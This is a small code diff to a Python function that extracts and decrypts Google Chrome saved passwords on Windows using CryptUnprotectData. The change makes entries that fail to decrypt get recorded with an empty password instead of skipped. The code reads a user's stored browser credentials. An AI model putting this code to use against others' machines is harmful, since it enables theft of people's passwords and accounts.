@@ -26,7 +26,7 @@ def get_chrome_saved_password():
             try:
                 password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
             except Exception:
-                continue
+                list_of_passwords.append((result[0], result[1], ""))
             if password:
                 list_of_passwords.append((result[0], result[1], password))
         return list_of_passwords
